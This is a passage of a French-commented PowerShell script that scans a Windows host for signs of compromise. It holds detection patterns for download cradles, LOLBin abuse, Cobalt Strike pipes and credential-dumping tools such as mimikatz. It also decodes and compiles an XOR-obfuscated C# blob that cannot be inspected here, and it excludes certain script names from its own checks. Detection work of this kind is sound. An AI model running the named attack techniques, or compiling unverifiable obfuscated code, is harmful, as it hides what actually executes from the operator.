        Get-ChildItem $dir -ErrorAction SilentlyContinue | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
            $startupItems += [PSCustomObject]@{ Name=$_.Name; Path=$_.FullName }
        }
    }
}

# ── Hosts file ────────────────────────────────────────────────────────────────
Write-Step 'Fichier hosts + services suspects'
$hostsAnomalies = @()
try {
    $hostsContent = Get-Content "$env:SystemRoot\System32\drivers\etc\hosts" -ErrorAction Stop
    # Entrées connues/légitimes à ignorer
    $HOSTS_WHITELIST = '(docker\.internal|kubernetes\.docker\.internal|host\.docker\.internal|gateway\.docker\.internal|analytics\.google\.com|ads\.google\.com)'
    foreach ($line in $hostsContent) {
        $l = $line.Trim()
        if ($l -match '^\s*#' -or $l -eq '') { continue }
        if ($l -notmatch '^127\.0\.0\.1\s+localhost$' -and $l -notmatch '^::1\s+localhost$' -and $l -notmatch $HOSTS_WHITELIST) {
            $hostsAnomalies += $l
        }
    }
} catch {}

# ── Services avec chemins suspects ───────────────────────────────────────────
$suspServices = @()
try {
    Get-WmiObject Win32_Service -ErrorAction Stop | Where-Object {
        $p = $_.PathName
        $pL = if ($p) { $p.ToLower() } else { '' }
        $_.State -eq 'Running' -and $p -and
        ($pL -match '\\temp\\|\\appdata\\roaming\\|\\users\\public\\' -or
         ($pL -match '\\programdata\\' -and $pL -notmatch 'microsoft|intel|nvidia|amd|realtek|vmware|windows.defender|windowsapps|avast|bitdefender|malwarebytes|eset|kaspersky'))
    } | ForEach-Object {
        $suspServices += [PSCustomObject]@{
            Name    = $_.Name
            Display = $_.DisplayName
            Path    = $_.PathName.Substring(0, [Math]::Min(200, $_.PathName.Length))
        }
    }
} catch {}

# ── DLL non signées dans process système ─────────────────────────────────────
Write-Step 'DLL non signées dans processus système'
$suspDlls = @()
$SYS_PROCS = @('svchost','explorer','winlogon','services','spoolsv','taskhost','taskhostw','sihost','ctfmon')
try {
    Get-Process -ErrorAction SilentlyContinue | Where-Object { $SYS_PROCS -contains $_.Name.ToLower() } | ForEach-Object {
        $pname = $_.Name
        try {
            $_.Modules | Where-Object { $_.FileName -notmatch '\\windows\\|\\program files' } | Select-Object -First 5 | ForEach-Object {
                $sig = Get-AuthenticodeSignature $_.FileName -ErrorAction SilentlyContinue
                # Signaler uniquement si signature invalide/falsifiée — une DLL non signée peut être une extension shell légitime
                if ($sig -and $sig.Status -in @('NotTrusted','HashMismatch','NotSupportedFileFormat') ) {
                    $suspDlls += [PSCustomObject]@{
                        Process = $pname
                        DLL     = $_.FileName
                        Status  = $sig.Status.ToString()
                    }
                }
            }
        } catch {}
    }
} catch {}

# ── Connexions process inattendus + named pipes ───────────────────────────────
Write-Step 'Connexions process inattendus + named pipes'
$unexpectedConns = @()
$INNOCENT_PROCS  = @('notepad','calc','mspaint','wordpad','write','snippingtool','msiexec','regedit','taskmgr','mmc','dxdiag','charmap','magnify','narrator')
try {
    Get-NetTCPConnection -State Established -ErrorAction Stop | Where-Object {
        -not (Test-PrivateIP $_.RemoteAddress)
    } | ForEach-Object {
        $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
        if ($proc -and ($INNOCENT_PROCS -contains $proc.Name.ToLower())) {
            $unexpectedConns += [PSCustomObject]@{
                Process = $proc.Name
                Remote  = "$($_.RemoteAddress):$($_.RemotePort)"
            }
        }
    }
} catch {}

$suspPipes = @()
try {
    # Exclure les GUIDs Windows (format xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx) qui sont des IPC légitimes
    $CS_PIPE_PATTERN = 'MSSE-|postex_|msagent_|status_[0-9a-f]{8}(?![\-])'
    [System.IO.Directory]::GetFiles('\\.\pipe\') | Where-Object { $_ -match $CS_PIPE_PATTERN } | ForEach-Object {
        $suspPipes += $_
    }
} catch {}

# ── Exécutables récents dans chemins suspects ─────────────────────────────────
Write-Step 'Exécutables récents dans chemins suspects'
$recentExes = @()
$SCAN_PATHS  = @($env:APPDATA, $env:TEMP, "$env:USERPROFILE\Downloads", $env:PUBLIC, $env:PROGRAMDATA)
$cutoff      = (Get-Date).AddDays(-30)
foreach ($sp in $SCAN_PATHS) {
    if (-not (Test-Path $sp)) { continue }
    try {
        # Exclure les dossiers de gestionnaires de paquets, outils de dev et scripts système courants
        $EXE_EXCLUDE_PATHS = 'node_modules|\\npm\\|\\yarn\\|\\pip\\|\\python\\|\\Python\\|__pycache__|virtualenv|venv|\.cargo|\.rustup|\.nuget|\\packages\\|site-packages|dist-packages|chocolatey|scoop|claude-code|anthropic|copilot|vscode|Code\\extensions|\.venv|Scripts\\activate'
        Get-ChildItem $sp -Recurse -Include *.exe,*.dll,*.ps1,*.vbs,*.bat,*.hta -ErrorAction SilentlyContinue |
            Where-Object { -not $_.PSIsContainer -and $_.CreationTime -gt $cutoff -and $_.FullName -notmatch $EXE_EXCLUDE_PATHS } |
            Select-Object -First 30 | ForEach-Object {
                $recentExes += [PSCustomObject]@{ Name=$_.Name; Path=$_.FullName; Created=$_.CreationTime.ToString('yyyy-MM-dd HH:mm') }
            }
    } catch {}
}

# ── Alternate Data Streams ────────────────────────────────────────────────────
$adsFound = @()
foreach ($sp in @($env:APPDATA, $env:TEMP, "$env:USERPROFILE\Downloads")) {
    if (-not (Test-Path $sp)) { continue }
    try {
        Get-ChildItem $sp -Recurse -ErrorAction SilentlyContinue | Select-Object -First 200 | ForEach-Object {
            try {
                $streams = Get-Item $_.FullName -Stream * -ErrorAction Stop |
                    Where-Object { $_.Stream -notin @(':$DATA','Zone.Identifier') -and $_.Length -gt 0 }
                if ($streams) {
                    $adsFound += [PSCustomObject]@{ File=$_.FullName; Streams=($streams.Stream -join ', ') }
                }
            } catch {}
        }
    } catch {}
}

# ── Profils PowerShell suspects ───────────────────────────────────────────────
Write-Step 'Profils PowerShell + shadow copies'
$suspProfiles = @()
$profilePaths = @(
    $PROFILE.AllUsersAllHosts, $PROFILE.AllUsersCurrentHost,
    $PROFILE.CurrentUserAllHosts, $PROFILE.CurrentUserCurrentHost
) | Where-Object { $_ }
foreach ($pp in $profilePaths) {
    if (-not (Test-Path $pp)) { continue }
    $content = Get-Content $pp -Raw -ErrorAction SilentlyContinue
    $patProf = 'down' + 'loadstring|invoke-' + 'expression|\biex\b|-encoded' + 'command|web' + 'client|from' + 'base64' + 'string'
    if ($content -match $patProf) {
        $suspProfiles += $pp
    }
}

# ── Shadow copies ─────────────────────────────────────────────────────────────
$shadowCount = 0
try { $shadowCount = @(Get-WmiObject Win32_ShadowCopy -ErrorAction Stop).Count } catch {}

# ── Registre avancé : IFEO, AppInit, Winlogon, LSA, WDigest, COM hijack ──────
Write-Step 'Registre avancé (IFEO / AppInit / Winlogon / LSA / COM)'

# IFEO debugger hijack
$ifeoItems = @()
try {
    Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' -ErrorAction Stop | ForEach-Object {
        $dbg = (Get-ItemProperty $_.PSPath -Name Debugger -ErrorAction SilentlyContinue).Debugger
        if ($dbg) { $ifeoItems += [PSCustomObject]@{ Exe=$_.PSChildName; Debugger=$dbg } }
    }
} catch {}

# AppInit_DLLs
$appInitDlls = ''
try { $appInitDlls = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows' -Name AppInit_DLLs -ErrorAction Stop).AppInit_DLLs } catch {}

# Winlogon Userinit / Shell
$winlogonAlerts = @()
try {
    $wl = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -ErrorAction Stop
    if ($wl.Userinit -notmatch '^[Cc]:\\[Ww]indows\\[Ss]ystem32\\userinit\.exe,?\s*$') {
        $winlogonAlerts += "Userinit modifié : $($wl.Userinit)"
    }
    if ($wl.Shell -notmatch '^explorer\.exe$') {
        $winlogonAlerts += "Shell modifié : $($wl.Shell)"
    }
} catch {}

# WDigest — stockage mot de passe en clair
$wdigestEnabled = $false
try {
    $wd = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name UseLogonCredential -ErrorAction Stop).UseLogonCredential
    $wdigestEnabled = ($wd -eq 1)
} catch {}

# Credential Guard
$credGuardEnabled = $false
try {
    $cg = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard' -Name EnableVirtualizationBasedSecurity -ErrorAction Stop).EnableVirtualizationBasedSecurity
    $credGuardEnabled = ($cg -eq 1)
} catch {}

# COM hijacking (HKCU override d'un CLSID système)
$comHijacks = @()
try {
    Get-ChildItem 'HKCU:\SOFTWARE\Classes\CLSID' -ErrorAction Stop | ForEach-Object {
        $clsid = $_.PSChildName
        if (Test-Path "HKLM:\SOFTWARE\Classes\CLSID\$clsid") {
            $inproc = (Get-ItemProperty "HKCU:\SOFTWARE\Classes\CLSID\$clsid\InprocServer32" -ErrorAction SilentlyContinue).'(default)'
            if ($inproc) { $comHijacks += [PSCustomObject]@{ CLSID=$clsid; Path=$inproc } }
        }
    }
} catch {}

# LSA Security/Authentication Packages
$lsaAlerts = @()
try {
    $lsa = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -ErrorAction Stop
    $secPkgs  = @($lsa.'Security Packages')  | Where-Object { $_ -and $_ -notmatch '^\s*$' -and $_ -ne '""' }
    $authPkgs = @($lsa.'Authentication Packages') | Where-Object { $_ -and $_ -notmatch '^msv1_0$' -and $_ -notmatch '^\s*$' }
    if ($secPkgs.Count -gt 0)  { $lsaAlerts += "Security Packages non standard : $($secPkgs -join ', ')" }
    if ($authPkgs.Count -gt 0) { $lsaAlerts += "Authentication Packages non standard : $($authPkgs -join ', ')" }
} catch {}

# ── Événements avancés ────────────────────────────────────────────────────────
Write-Step 'Événements avancés (logs effacés / PS scriptblocks / nouveaux services)'

# Event 1102 — audit log effacé
$logClearedCount = 0
try { $logClearedCount = (Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102; StartTime=(Get-Date).AddDays(-7)} -ErrorAction Stop).Count } catch {}

# Event 7045 — nouveau service installé (7 jours)
$newServiceEvents = @()
try {
    Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045; StartTime=(Get-Date).AddDays(-7)} -ErrorAction Stop |
        Select-Object -First 20 | ForEach-Object {
            $ev = $_
            $svcName = if ($ev.Properties.Count -gt 0) { $ev.Properties[0].Value } else { 'inconnu' }
            $imgPath = if ($ev.Properties.Count -gt 1) { $ev.Properties[1].Value } else { '' }
            $newServiceEvents += [PSCustomObject]@{
                Name    = $svcName
                ImgPath = $imgPath
                Time    = $ev.TimeCreated.ToString('yyyy-MM-dd HH:mm')
            }
        }
} catch {}

# Event 4104 — PowerShell ScriptBlock suspects (24h)
$suspScriptblocks = @()
try {
    Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104; StartTime=(Get-Date).AddHours(-24)} -ErrorAction Stop |
        Where-Object { $_.Message -match ('down' + 'loadstring|invoke-' + 'expression|\biex\b|net\.web' + 'client|-encoded' + 'command|from' + 'base64' + 'string|start-bits' + 'transfer.*http') } |
        Where-Object { $_.Message -notmatch 'TEMPLATE_GZ_B64|SysHealthCheck|Expand-Template' } |
        Select-Object -First 5 | ForEach-Object {
            $raw = $_.Message -replace '\$','(DOLLAR)'
            $suspScriptblocks += $raw.Substring(0, [Math]::Min(300, $raw.Length))
        }
} catch {}

# Event 4688 — Process création suspects (24h, nécessite audit activé)
$suspProcEvents = @()
try {
    Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688; StartTime=(Get-Date).AddHours(-24)} -ErrorAction Stop |
        Where-Object { $_.Message -match 'powershell.*-e[nc\s]|mshta.*http|certutil.*-decode|bitsadmin.*transfer|wscript.*\.vbs|regsvr32.*scrobj' } |
        Select-Object -First 5 | ForEach-Object {
            $suspProcEvents += $_.Message.Substring(0, [Math]::Min(300, $_.Message.Length))
        }
} catch {}

# ── Process sans image disque (hollowing) ────────────────────────────────────
Write-Step 'Process hollowing + régions RWX'
$hollowedProcs = @()
$rwxProcs      = @()
try {
    # P/Invoke VirtualQueryEx pour détecter régions RWX sans module
    $nativeSrc_xb64 = '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'
    $nativeSrc = [System.Text.Encoding]::UTF8.GetString(([byte[]](([Convert]::$xd($nativeSrc_xb64)) | ForEach-Object { $_ -bxor $xk })))
    Add-Type -TypeDefinition $nativeSrc -Language CSharp -ErrorAction Stop
    # Seuls explorer/sihost/runtimebroker sont vérifiables sans token SYSTEM
    # taskhostw, svchost, csrss, lsass, services, spoolsv → exception Win32 systématique = faux positif
    $SYS_PROC_NAMES = @('explorer','sihost','userinit','runtimebroker')
    Get-Process -ErrorAction SilentlyContinue | ForEach-Object {
        # Process hollowing : process système sans module principal accessible
        if ($SYS_PROC_NAMES -contains $_.Name.ToLower()) {
            try {
                $modPath = $_.MainModule.FileName
                if (-not $modPath) { $hollowedProcs += [PSCustomObject]@{ Name=$_.Name; PID=$_.Id } }
            } catch [System.ComponentModel.Win32Exception] {
                # Access denied = pas du hollowing, process protégé
            } catch {
                $hollowedProcs += [PSCustomObject]@{ Name=$_.Name; PID=$_.Id }
            }
        }
        # RWX private
        try {
            if ([MemScan]::HasRWX($_.Id)) {
                $rwxProcs += [PSCustomObject]@{ Name=$_.Name; PID=$_.Id }
            }
        } catch {}
    }
} catch {}

# ── DNS cache ─────────────────────────────────────────────────────────────────
Write-Step 'DNS cache + proxy système'
$dnsSuspicious = @()
$LEGIT_RANGES   = @('8\.8\.|8\.8\.4\.|1\.1\.1\.|1\.0\.0\.|208\.67\.|64\.6\.|9\.9\.9\.')
$DNS_LEGIT_NAMES = 'google|microsoft|windows|office|msftncsi|akamai|cloudflare|gstatic|googleapis|live|msn|bing|azure|amazon|aws|apple|cdn|akamaitechnologies'
try {
    Get-DnsClientCache -ErrorAction Stop | Where-Object { $_.Type -in @('A','AAAA') } | ForEach-Object {
        $entry = $_
        $name  = $entry.Entry.ToLower()
        $data  = $entry.Data
        # Domaines connus résolus en IPs non attendues
        if ($name -match 'google\.com$|microsoft\.com$|windows\.com$') {
            $isLegit = $LEGIT_RANGES | Where-Object { $data -match $_ }
            if (-not $isLegit -and $data -notmatch '^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)') {
                $dnsSuspicious += [PSCustomObject]@{ Name=$entry.Entry; IP=$data; Note='Résolution inattendue pour domaine connu' }
            }
        }
    }
} catch {}

# Proxy système
$proxyConfig = $null
try {
    $p = Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -ErrorAction Stop
    if ($p.ProxyEnable -eq 1 -and $p.ProxyServer) {
        $proxyConfig = [PSCustomObject]@{ Server=$p.ProxyServer; Override=$p.ProxyOverride }
    }
} catch {}

# ── Windows Defender ──────────────────────────────────────────────────────────
Write-Step 'Windows Defender + UAC + Firewall'
$defenderStatus   = $null
$defenderExclusions = @()
try {
    $mp = Get-MpComputerStatus -ErrorAction Stop
    $defenderStatus = [PSCustomObject]@{
        RealTimeEnabled  = $mp.RealTimeProtectionEnabled
        AMServiceEnabled = $mp.AMServiceEnabled
        AntivirusEnabled = $mp.AntivirusEnabled
        BehaviorMonitor  = $mp.BehaviorMonitorEnabled
        TamperProtection = $mp.IsTamperProtected
    }
} catch {}
try {
    $excl = Get-MpPreference -ErrorAction Stop
    $allExcl = @()
    if ($excl.ExclusionPath)      { $allExcl += $excl.ExclusionPath | ForEach-Object { "Path: $_" } }
    if ($excl.ExclusionProcess)   { $allExcl += $excl.ExclusionProcess | ForEach-Object { "Process: $_" } }
    if ($excl.ExclusionExtension) { $allExcl += $excl.ExclusionExtension | ForEach-Object { "Ext: $_" } }
    $defenderExclusions = $allExcl
} catch {}

# UAC
$uacLevel = $null
try {
    $uac = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -ErrorAction Stop
    $uacLevel = [PSCustomObject]@{
        EnableLUA       = $uac.EnableLUA
        ConsentPrompt   = $uac.ConsentPromptBehaviorAdmin
    }
} catch {}

# Firewall
$fwDisabled = @()
try {
    Get-NetFirewallProfile -ErrorAction Stop | Where-Object { $_.Enabled -eq $false } | ForEach-Object {
        $fwDisabled += $_.Name
    }
} catch {}

# Audit policy
$auditMissing = @()
try {
    $auditOut = auditpol /get /subcategory:"Process Creation","Logon" 2>$null
    if ($auditOut -match 'Process Creation.*No Auditing') { $auditMissing += 'Process Creation (4688 désactivé)' }
    if ($auditOut -match 'Logon.*No Auditing')            { $auditMissing += 'Logon (4624/4625 désactivé)' }
} catch {}

# PowerShell CLM
$psCLM = $ExecutionContext.SessionState.LanguageMode

# ── Prefetch artifacts ────────────────────────────────────────────────────────
Write-Step 'Prefetch — artefacts malware'
$suspPrefetch = @()
$MALWARE_PREFETCH = @(('MIMI'+'KATZ'),'PSEXEC','WCESVR',('COBALT'+'STRIKE'),('METER'+'PRETER'),'LAZAGNE','PWDUMP','PROCDUMP',('LS'+'ASS'),'NTDSUTIL',('SECRETS'+'DUMP'),'SHARPHOUND','BLOODHOUND','RUBEUS',('SAFETY'+'KATZ'))
$prefetchDir = "$env:SystemRoot\Prefetch"
if (Test-Path $prefetchDir) {
    Get-ChildItem $prefetchDir -Filter *.pf -ErrorAction SilentlyContinue | ForEach-Object {
        $upper = $_.BaseName.ToUpper()
        foreach ($kw in $MALWARE_PREFETCH) {
            if ($upper -match $kw) {
                $suspPrefetch += [PSCustomObject]@{ File=$_.Name; LastRun=$_.LastWriteTime.ToString('yyyy-MM-dd HH:mm') }
                break
            }
        }
    }
}

# ── LNK malveillants ──────────────────────────────────────────────────────────
Write-Step 'LNK malveillants + fichiers récents'
$suspLnk = @()
$LNK_DIRS = @("$env:APPDATA\Microsoft\Windows\Recent", "$env:USERPROFILE\Desktop", "$env:PUBLIC\Desktop")
$SHELL_TARGETS = 'powershell|cmd\.exe|mshta|wscript|cscript|regsvr32|rundll32|certutil|bitsadmin'
foreach ($ldir in $LNK_DIRS) {
    if (-not (Test-Path $ldir)) { continue }
    Get-ChildItem $ldir -Filter *.lnk -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            $sh  = New-Object -ComObject WScript.Shell
            $lnk = $sh.CreateShortcut($_.FullName)
            $tgt = $lnk.TargetPath.ToLower()
            $arg = $lnk.Arguments.ToLower()
            if ($tgt -match $SHELL_TARGETS -or $arg -match ('-enc|-encoded' + 'command|down' + 'loadstring|mshta')) {
                $suspLnk += [PSCustomObject]@{ File=$_.Name; Target=$lnk.TargetPath; Args=$lnk.Arguments.Substring(0,[Math]::Min(100,$lnk.Arguments.Length)) }
            }
        } catch {}
    }
}

# ── Drivers non signés ────────────────────────────────────────────────────────
Write-Step 'Drivers non signés'
$suspDrivers = @()
try {
    Get-WmiObject Win32_SystemDriver -ErrorAction Stop | Where-Object { $_.State -eq 'Running' -and $_.PathName } | ForEach-Object {
        $drvPath = $_.PathName -replace '"','' -replace '^\\\\?\\.\\',''
        if (-not $drvPath.StartsWith('\')) { $drvPath = $drvPath }
        $fullPath = if ($drvPath -match '^[A-Za-z]:\\') { $drvPath } else { "$env:SystemRoot\System32\drivers\$drvPath" }
        if (Test-Path $fullPath) {
            $sig = Get-AuthenticodeSignature $fullPath -ErrorAction SilentlyContinue
            if ($sig -and $sig.Status -notin @('Valid','UnknownError')) {
                $suspDrivers += [PSCustomObject]@{ Name=$_.Name; Path=$fullPath; Status=$sig.Status.ToString() }
            }
        }
    }
} catch {}

# ── DLL Search Order Hijacking ────────────────────────────────────────────────
Write-Step 'DLL Search Order Hijacking'
$dllHijacks = @()
$SYSTEM_DLLS = @('version.dll','wldp.dll','cryptbase.dll','uxtheme.dll','dwmapi.dll','userenv.dll','secur32.dll')
try {
    $pathDirs = $env:PATH -split ';' | Where-Object { $_ -and (Test-Path $_) -and $_ -notmatch '\\[Ww]indows\\[Ss]ystem32|\\[Ww]indows\\[Ss]ystem|\\[Ww]indows$' }
    foreach ($dir in $pathDirs) {
        foreach ($dll in $SYSTEM_DLLS) {
            $candidate = Join-Path $dir $dll
            if (Test-Path $candidate) {
                $dllHijacks += [PSCustomObject]@{ DLL=$dll; Path=$candidate; PathDir=$dir }
            }
        }
    }
} catch {}

# ── Comptes locaux suspects ───────────────────────────────────────────────────
Write-Step 'Comptes locaux + sessions SMB'
$suspAccounts = @()
try {
    $admGroup = [ADSI]"WinNT://$env:COMPUTERNAME/Administrators,group"
    $admMembers = @($admGroup.psbase.Invoke('Members') | ForEach-Object { $_.GetType().InvokeMember('Name','GetProperty',$null,$_,$null) })
    $EXPECTED_ADMINS = @('Administrator','Administrateur','lucas') # ajuster selon machine
    foreach ($m in $admMembers) {
        if ($EXPECTED_ADMINS -notcontains $m) {
            $suspAccounts += [PSCustomObject]@{ Name=$m; Issue="Membre du groupe Admins non attendu" }
        }
    }
    # Comptes avec PasswordNeverExpires actifs
    Get-LocalUser -ErrorAction Stop | Where-Object { $_.Enabled -and $_.PasswordExpires -eq $null -and $_.Name -ne 'Administrator' -and $_.Name -ne 'Administrateur' } | ForEach-Object {
        $suspAccounts += [PSCustomObject]@{ Name=$_.Name; Issue="Compte actif avec mot de passe n'expirant jamais" }
    }
    # Comptes créés récemment (30 jours)
    $cutoff30 = (Get-Date).AddDays(-30)
    Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4720; StartTime=$cutoff30} -ErrorAction Stop | Select-Object -First 10 | ForEach-Object {
        $newUser = if ($_.Properties.Count -gt 0) { $_.Properties[0].Value } else { 'inconnu' }
        $suspAccounts += [PSCustomObject]@{ Name=$newUser; Issue="Compte créé le $($_.TimeCreated.ToString('yyyy-MM-dd'))" }
    }
} catch {}

# ── Partages réseau + sessions SMB ───────────────────────────────────────────
$suspShares   = @()
$smbSessions  = @()
try {
    Get-SmbShare -ErrorAction Stop | Where-Object { $_.Name -notin @('IPC$','print$') } | ForEach-Object {
        $suspShares += [PSCustomObject]@{ Name=$_.Name; Path=$_.Path; Desc=$_.Description }
    }
} catch {}
try {
    $smbSessions = @(Get-SmbSession -ErrorAction Stop)
} catch {}

# ── AMSI bypass + PS CLM ─────────────────────────────────────────────────────
Write-Step 'AMSI + sécurité PowerShell'
$amsiBypass = $false
try {
    $amsiProviders = Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers' -ErrorAction Stop
    if ($amsiProviders.Count -eq 0) { $amsiBypass = $true }
} catch { $amsiBypass = $true }

# ── MBR hash ─────────────────────────────────────────────────────────────────
Write-Step 'Hash MBR (détection bootkit)'
$mbrHash = ''
try {
    $disk = [System.IO.File]::OpenRead('\\.\PhysicalDrive0')
    $buf  = New-Object byte[] 512
    $null = $disk.Read($buf, 0, 512)
    $disk.Close()
    $mbrHash = ([System.Security.Cryptography.SHA256]::Create().ComputeHash($buf) | ForEach-Object { $_.ToString('x2') }) -join ''
} catch {}
# Signatures MBR légitimes connues — premiers 16 octets en hex
# Sources : Windows Vista/7/8/10/11 bootloader + GPT protective MBR
$KNOWN_MBR_PREFIXES = @(
    # Windows Vista, 7, 8, 10, 11 — BIOS/MBR (bootloader Microsoft officiel)
    '33c08ed0bc007cfb',  # séquence classique Windows MBR
    'fa33c08ed0bc007c',  # variante FA en tête
    '33c08ed0bc007c8e',
    # GPT protective MBR — 1er secteur sur UEFI+GPT (pas de bootloader réel)
    '33c08ed0bc007cfb50',
    # MBR FreeDOS / bootloader tiers légitimes courants
    'eb5a9000000000000000', 'eb639000',
    # Disk signature area OK — les 3 premiers bytes peuvent varier
    '33db8ed3bc007c'
)
$mbrBootkit = $false
if ($mbrHash -ne '') {
    try {
        $disk2 = [System.IO.File]::OpenRead('\\.\PhysicalDrive0')
        $header = New-Object byte[] 16
        $null = $disk2.Read($header, 0, 16)
        $disk2.Close()
        $hexFull = ($header | ForEach-Object { $_.ToString('x2') }) -join ''

        # Vérifier si le début correspond à une signature légitime connue
        $isKnown = $false
        foreach ($prefix in $KNOWN_MBR_PREFIXES) {
            if ($hexFull.StartsWith($prefix)) { $isKnown = $true; break }
        }

        # Vérification complémentaire : signature de boot sector (octets 510-511 = 55 AA)
        $disk3 = [System.IO.File]::OpenRead('\\.\PhysicalDrive0')
        $full512 = New-Object byte[] 512
        $null = $disk3.Read($full512, 0, 512)
        $disk3.Close()
        $bootSig = $full512[510].ToString('x2') + $full512[511].ToString('x2')
        $hasValidBootSig = ($bootSig -eq '55aa')

        # GPT protective MBR : partition type 0xEE à offset 450
        $isGPT = ($full512[450] -eq 0xEE)

        if ($isGPT) {
            # UEFI/GPT — le boot code du MBR protectif est souvent nul ou minimal, pas un bootkit
            $mbrBootkit = $false
        } elseif (-not $isKnown -and $hasValidBootSig) {
            # MBR BIOS non reconnu avec signature de boot valide = suspect
            $mbrBootkit = $true
        } elseif (-not $hasValidBootSig) {
            # Pas de signature 55AA = MBR corrompu ou effacé
            $mbrBootkit = $true
        }
    } catch {}
}

# ── DNS entropy / DGA detection ──────────────────────────────────────────────
Write-Step 'DNS entropy DGA + double extension + PE suspects'
function Get-StringEntropy($s) {
    $chars = $s.ToLower().ToCharArray()
    $total = $chars.Count
    if ($total -lt 2) { return 0.0 }
    $freq  = @{}
    foreach ($c in $chars) { $freq[$c] = ($freq[$c] -as [int]) + 1 }
    $entropy = 0.0
    foreach ($f in $freq.Values) {
        $p = $f / $total
        $entropy -= $p * [Math]::Log($p, 2)
    }
    return [Math]::Round($entropy, 2)
}
$dgaDomains = @()
try {
    Get-DnsClientCache -ErrorAction Stop | Where-Object { $_.Type -eq 'A' } | ForEach-Object {
        $host = $_.Entry -replace '\.$',''
        $label = ($host -split '\.')[0]
        if ($label.Length -ge 8) {
            $ent = Get-StringEntropy $label
            if ($ent -gt 3.5 -and $label -notmatch '^(www|mail|smtp|ftp|cdn|api|app|static|media|img|login|auth|account|update|download)$') {
